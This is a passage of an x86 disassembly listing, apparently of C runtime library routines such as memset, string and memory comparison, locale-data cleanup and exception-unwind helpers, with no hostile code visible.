  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
